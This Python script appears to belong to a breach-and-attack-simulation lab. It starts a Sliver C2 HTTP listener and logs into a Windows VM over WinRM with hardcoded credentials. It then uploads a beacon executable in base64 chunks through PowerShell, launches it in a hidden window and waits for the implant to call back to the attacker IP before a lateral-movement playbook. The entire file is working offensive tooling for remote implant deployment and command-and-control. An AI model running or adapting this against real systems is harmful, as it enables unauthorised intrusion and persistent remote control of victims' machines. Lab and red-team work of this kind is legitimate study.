#!/usr/bin/env python3
"""Full C2 setup: start HTTP listener + deploy beacon to Windows VM via WinRM + wait for beacon"""
import asyncio, base64, sys, os
from sliver import SliverClientConfig, SliverClient

CONFIG_PATH = os.path.expanduser("~/.sliver-client/configs/bas_operator_localhost.cfg")
ATTACKER_IP = "192.168.56.101"
TARGET_IP   = "192.168.56.102"
TARGET_USER = "akila"
TARGET_PASS = "12345678"
HTTP_PORT   = 8443
IMPLANT_SRC = "/home/akila/Desktop/bas_platform/sliver_implants/bas_beacon.exe"

def deploy_beacon_winrm():
    """Upload and execute the beacon on the Windows VM using WinRM"""
    import winrm

    session = winrm.Session(
        f'http://{TARGET_IP}:5985/wsman',
        auth=(TARGET_USER, TARGET_PASS),
        transport='ntlm'
    )

    # Read implant
    with open(IMPLANT_SRC, 'rb') as f:
        data = f.read()

    print(f"[*] Uploading {len(data)//1024}KB beacon to Windows VM {TARGET_IP}...")

    # Upload in chunks
    chunk_size = 40000
    chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
    print(f"    Total chunks: {len(chunks)}")

    # Init empty file
    r = session.run_ps(
        "[IO.File]::WriteAllBytes('C:\\Users\\akila\\Desktop\\bas_beacon.exe', [byte[]]@()); "
        "Write-Host 'initialized'"
    )
    print(f"   Init: {r.std_out.decode().strip()}")

    # Append each chunk
    for i, chunk in enumerate(chunks):
        b64 = base64.b64encode(chunk).decode()
        ps = (
            f"$b = [Convert]::FromBase64String('{b64}');"
            "$s = [IO.File]::Open('C:\\Users\\akila\\Desktop\\bas_beacon.exe',"
            "[IO.FileMode]::Append,[IO.FileAccess]::Write);"
            "$s.Write($b,0,$b.Length); $s.Close(); Write-Host 'ok'"
        )
        r2 = session.run_ps(ps)
        if i % 10 == 0:
            print(f"   Progress: chunk {i+1}/{len(chunks)}")
        if r2.status_code != 0:
            print(f"   WARNING chunk {i}: {r2.std_err.decode().strip()[:100]}")

    # Verify size
    r3 = session.run_ps("(Get-Item 'C:\\Users\\akila\\Desktop\\bas_beacon.exe').Length")
    print(f"[+] Uploaded! Remote file size: {r3.std_out.decode().strip()} bytes")

    # Execute beacon in background (hidden window)
    print("[*] Executing beacon on Windows VM...")
    r4 = session.run_ps(
        "Start-Process -FilePath 'C:\\Users\\akila\\Desktop\\bas_beacon.exe' "
        "-WindowStyle Hidden; Write-Host 'launched'"
    )
    print(f"[+] Launch: {r4.std_out.decode().strip()} (err: {r4.std_err.decode().strip()[:100]})")
    return True

async def main():
    # 1. Connect to Sliver
    print(f"[*] Connecting to Sliver server (localhost:31337)...")
    config = SliverClientConfig.parse_config_file(CONFIG_PATH)
    client = SliverClient(config)
    await client.connect()
    print("[+] Connected to Sliver!")

    # 2. Start HTTP listener
    print(f"\n[*] Starting HTTP listener on 0.0.0.0:{HTTP_PORT}...")
    try:
        job = await client.start_http_listener(host="0.0.0.0", port=HTTP_PORT, domain="", website="")
        print(f"[+] HTTP listener started (Job ID: {job.JobID})")
    except Exception as e:
        print(f"[!] Listener note: {e}")

    jobs = await client.jobs()
    for j in jobs:
        print(f"    Active: [{j.ID}] {j.Name} :{j.Port}")

    # 3. Deploy beacon via WinRM
    print(f"\n[*] Deploying beacon to {TARGET_IP}...")
    try:
        deploy_beacon_winrm()
    except Exception as e:
        print(f"[-] WinRM deploy failed: {e}")
        print("    [!] If Windows Defender blocked it, you may need to manually run the beacon")
        print(f"    [!] Beacon is at: {IMPLANT_SRC}")

    # 4. Wait for beacon check-in
    print(f"\n[*] Waiting for beacon check-in on C2 listener http://{ATTACKER_IP}:{HTTP_PORT}...")
    print("    (checking every 10s, up to 3 minutes)")
    for attempt in range(18):
        await asyncio.sleep(10)
        try:
            beacons = await client.beacons()
        except Exception:
            beacons = []

        if beacons:
            b = beacons[0]
            print(f"\n{'='*60}")
            print(f"  [+] *** REAL SLIVER BEACON CHECKED IN! ***")
            print(f"{'='*60}")
            print(f"  Beacon ID:  {b.ID}")
            print(f"  Name:       {b.Name}")
            print(f"  Hostname:   {b.Hostname}")
            print(f"  OS:         {b.OS}/{b.Arch}")
            print(f"  Username:   {b.Username}")
            print(f"  PID:        {b.PID}")
            print(f"  C2 URL:     {b.ActiveC2}")
            print(f"  Interval:   {b.Interval}s")
            print(f"{'='*60}")
            print(f"\n[+] C2 session active! Ready for lateral movement playbook.")
            print(f"\nTo use with the playbook, run:")
            print(f"  export SLIVER_SESSION_ID={b.ID}")
            print(f"  ./playbooks/lateral_movement_sliver.sh")
            return
        else:
            print(f"  [{attempt+1}/18] No beacon yet... ({(attempt+1)*10}s elapsed)")

    print("\n[-] No beacon checked in after 3 minutes.")
    print("    Possible causes:")
    print("    1. Windows Defender blocked/deleted the exe")
    print("    2. Network connectivity issue (check eth1 on Kali)")
    print("    3. Beacon not executed on Windows")
    print(f"\n    Try manually running on Windows VM:")
    print(f"    C:\\Users\\akila\\Desktop\\bas_beacon.exe")

if __name__ == "__main__":
    asyncio.run(main())
